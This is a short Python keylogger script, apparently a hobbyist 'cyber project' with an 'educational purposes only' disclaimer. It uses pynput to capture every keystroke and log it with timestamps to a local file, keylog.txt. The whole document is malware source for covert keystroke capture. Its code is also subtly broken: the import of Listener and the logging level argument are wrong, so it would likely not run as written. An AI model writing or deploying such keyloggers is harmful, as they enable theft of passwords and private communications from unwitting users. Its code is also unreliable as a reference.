# Key Logger cyber project
# THIS IS FOR EDUCATIONAL PURPOSES ONLY
# DO NOT USE IT FOR ILLEGAL ACTIVITIES

# Import necessary libraries
# Handles keyboard events with minimal overhead
# Logging provides built-in functions to log messages to a file
from pynput import keyboard, Listener
import logging

# Set up the logging configuration
# Establishes where and how keystrokes will be stored
# Debug level logs are used to capture detailed information with timestamps
logging.basicConfig(filename=("keylog.txt"), level=logging.debug, format='%(asctime)s: %(message)s')

# Function to log key presses
# Converts keystrokes into string format and writes them to a log file
def on_press(key):
    logging.info(str(key))

# Initialize the listener, join it to main thread
# Prevents the script from exiting immediately
with Listener(on_press=on_press) as listener:
    listener.join() # Start the listener